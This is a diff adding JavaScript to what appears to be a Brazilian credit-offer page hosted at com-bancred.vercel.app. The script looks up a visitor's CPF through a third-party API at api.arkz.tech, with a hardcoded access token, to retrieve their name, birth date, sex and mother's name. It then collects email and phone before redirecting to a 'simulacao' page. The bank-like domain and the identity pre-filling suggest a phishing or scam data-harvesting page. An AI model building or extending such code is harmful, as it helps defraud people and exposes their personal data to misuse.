@@ -393,4 +393,167 @@
     });
 </script>
 
+    <script>
+document.addEventListener("DOMContentLoaded", function () {
+
+    /* =========================
+       CONFIGURAÇÃO DA API (EDITÁVEL)
+    ========================= */
+    const API_CONFIG = {
+        baseUrl: "https://api.arkz.tech/api",
+        endpoint: "/cpf",
+        token: "eda7dd28b39f2480fdf204e5a440cdbd8a250528cbf56769d6503a6ee7d8cff8"
+    };
+
+    function getCpfApiUrl(cpf) {
+        return `${API_CONFIG.baseUrl}${API_CONFIG.endpoint}/${API_CONFIG.token}/${cpf}`;
+    }
+
+    /* =========================
+       VALIDA EMAIL (ORIGINAL)
+    ========================= */
+    function validarEmail(email) {
+        const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        return regex.test(email);
+    }
+
+    /* =========================
+       RECUPERA DADOS (ORIGINAL)
+    ========================= */
+    let userData = sessionStorage.getItem("userData");
+
+    if (!userData) {
+        window.location.href = "https://com-bancred.vercel.app/cpf/";
+        return;
+    }
+
+    try {
+        userData = JSON.parse(userData);
+    } catch (e) {
+        sessionStorage.removeItem("userData");
+        window.location.href = "https://com-bancred.vercel.app/cpf/";
+        return;
+    }
+
+    /* =========================
+       SE NÃO EXISTIR DADOS, BUSCA NA API
+       (SEM MEXER NA LÓGICA VISUAL)
+    ========================= */
+    if (!userData.NOME && userData.CPF) {
+        fetch(getCpfApiUrl(userData.CPF))
+            .then(res => res.json())
+            .then(data => {
+                userData.NOME = data.nome || '';
+                userData.NASC = data.nascimento || '';
+                userData.SEXO = data.sexo || '';
+                userData.NOME_MAE = data.mae || '';
+
+                sessionStorage.setItem("userData", JSON.stringify(userData));
+                preencherDados();
+            })
+            .catch(() => {
+                window.location.href = "https://com-bancred.vercel.app/cpf/";
+            });
+    } else {
+        preencherDados();
+    }
+
+    /* =========================
+       PREENCHIMENTO ORIGINAL
+    ========================= */
+    function preencherDados() {
+        $('#name').text(userData.NOME || '');
+        $('#nascimento').text(userData.NASC || '');
+        $('#genero').text(userData.SEXO || '');
+        $('#mae').text(userData.NOME_MAE || '');
+
+        const primeiroNome = userData.NOME ? userData.NOME.split(' ')[0] : '';
+        $('.firstname').text(primeiroNome);
+
+        aplicarEventos(primeiroNome);
+    }
+
+    /* =========================
+       EVENTOS ORIGINAIS
+    ========================= */
+    function aplicarEventos(primeiroNome) {
+
+        $("#phone")
+            .mask("(99) 99999-9999")
+            .on("focusout", function () {
+                let phone = this.value.replace(/\D/g, '');
+                $(this).unmask();
+                $(this).mask(phone.length > 10 ? "(99) 99999-9999" : "(99) 9999-9999");
+            });
+
+        $('#phone, #email').on('input', function () {
+            $(this).removeClass('border-red-500');
+            $(this).closest('.relative')
+                .next('p[data-testid="error-message"]')
+                .addClass('hidden')
+                .removeClass('flex')
+                .html('');
+        });
+
+        $('#form-complementar').on('submit', function (e) {
+            e.preventDefault();
+
+            let email = $('#email').val().trim();
+            let telefone = $('#phone').val().trim();
+            let hasError = false;
+
+            $('p[data-testid="error-message"]').addClass('hidden').removeClass('flex').html('');
+            $('#email, #phone').removeClass('border-red-500');
+
+            if (!email || !validarEmail(email)) {
+                mostrarErro('#email', 'Informe um e-mail válido.');
+                hasError = true;
+            }
+
+            if (!telefone || telefone.replace(/\D/g, '').length < 10) {
+                mostrarErro('#phone', 'Informe um telefone válido.');
+                hasError = true;
+            }
+
+            if (hasError) return;
+
+            $('button[type="submit"]').text('Processando...').prop('disabled', true);
+
+            userData.email = email;
+            userData.telefone = telefone;
+
+            sessionStorage.setItem("userData", JSON.stringify(userData));
+
+            setTimeout(() => {
+                window.location.href = "https://com-bancred.vercel.app/simulacao";
+            }, 1200);
+        });
+    }
+
+    /* =========================
+       ERRO ORIGINAL
+    ========================= */
+    function mostrarErro(input, mensagem) {
+        $(input).addClass('border-red-500');
+        $(input).closest('.relative')
+            .next('p[data-testid="error-message"]')
+            .removeClass('hidden')
+            .addClass('flex')
+            .html(`
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24"
+                    viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                    stroke-linecap="round" stroke-linejoin="round"
+                    class="lucide lucide-circle-alert mt-0.5 h-4 w-4 flex-shrink-0">
+                    <circle cx="12" cy="12" r="10"></circle>
+                    <line x1="12" x2="12" y1="8" y2="12"></line>
+                    <line x1="12" x2="12.01" y1="16" y2="16"></line>
+                </svg>
+                <span>${mensagem}</span>
+            `);
+    }
+
+});
+</script>
+
+
 </body></html>
